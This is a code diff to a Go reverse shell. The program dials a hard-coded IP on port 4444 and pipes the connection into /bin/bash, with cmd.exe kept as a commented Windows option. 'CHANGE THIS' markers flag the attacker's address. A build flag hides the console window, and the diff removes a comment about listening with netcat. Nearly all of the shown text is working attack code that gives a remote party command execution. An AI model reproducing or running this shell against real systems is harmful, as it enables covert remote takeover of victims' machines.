@@ -1,6 +1,5 @@
-// Change IP and PORT with yours
+// For windows
 // Build with: go build -ldflags -H=windowsgui windows-rs.go
-// Listen with: nc -lnvp 4444
 
 package main
 
@@ -12,7 +11,9 @@ import (
 )
 
 func handle(conn net.Conn) {
- cmd := exec.Command("cmd.exe")
+ cmd := exec.Command("/bin/bash")
+ // For windows
+ // cmd := exec.Command("cmd.exe")
  rp, wp := io.Pipe()
  cmd.Stdin = conn
  cmd.Stdout = wp
@@ -23,8 +24,8 @@ func handle(conn net.Conn) {
 }
 
 func main() {
- IP :=  "169.254.89.168"
- PORT := 4444
+ IP :=  "169.254.89.168"                    // CHANGE THIS
+ PORT := 4444                               // CHANGE THIS
  address := fmt.Sprintf("%s:%d",IP,PORT)
 
  conn , err := net.Dial("tcp",address)
